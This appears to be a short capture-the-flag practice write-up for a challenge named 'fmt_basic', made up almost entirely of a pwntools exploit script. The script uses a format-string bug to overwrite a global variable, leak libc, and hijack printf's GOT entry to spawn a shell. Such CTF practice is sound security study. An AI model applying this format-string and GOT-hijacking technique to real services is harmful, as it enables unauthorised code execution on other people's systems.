## Practice

### fmt_basic
In challenge of fmt_basic, fmt attack is used to overwrite global variable, leak libc address, and gothijacking.  
```python
# exp.py
from pwn import *

context.arch = 'amd64'

r = process('./fmt_basic')

a = 0x6012ac
libc_got = 0x6011e0
printf_got = 0x601230
system_off = 0x45390

r.recvuntil('\n')
# write faceb00c into address and leak random value, %26 is libc got
payload = '%45068c%24$hn%19138c%25$hnhi%8$p.%9$phi%26$s'.ljust(0x40, '\x00')
payload += p64(a) + p64(a+2) + p64(libc_got)
r.sendline(payload)

r.recvuntil('hi0x')
secret = p64( int(r.recvuntil('.')[:-1], 16) )
r.recvuntil('0x')
secret += p64( int(r.recvuntil('hi')[:-2],16) )
# get libc address
libc_base = u64( r.recvuntil('{').ljust(8, '\x00') ) - 0x20740
print  'get libc base address: ', hex( libc_base ) 
r.sendafter(':P ?', secret)

system_addr = libc_base + system_off
print 'get system address: ', hex(system_addr)
# get last byte
last1 = int(system_addr & 0xff)
# get index -2 and -3 byte
first2 = int( (system_addr & 0xffff00) >> 8 )

# hijack printf got
# raw_input()
# here the length is little strange, cannot use 0x20 because read(0x2f)
hijack = '%{}c%14$hhn%{}c%15$hn'.format( last1, first2 - last1 ).ljust(0x18, '\x00')
hijack += p64(printf_got) + p64(printf_got+1)

r.send(hijack)

r.send('sh')

r.interactive()
```  
Thanks to the challenge of yuawn:)
